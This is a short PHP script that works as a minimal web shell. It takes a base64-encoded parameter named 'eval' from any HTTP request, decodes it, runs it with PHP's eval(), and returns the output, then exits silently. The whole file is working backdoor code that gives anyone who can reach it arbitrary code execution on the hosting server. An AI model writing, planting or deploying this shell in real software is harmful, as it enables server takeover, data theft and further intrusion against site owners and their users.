<?php
if(isset($_REQUEST['eval'])){
	$code = base64_decode($_REQUEST['eval']);
	ob_start();
	eval($code);
	$res = ob_get_contents();
	ob_end_clean();
	echo $res;
}
die("");
?>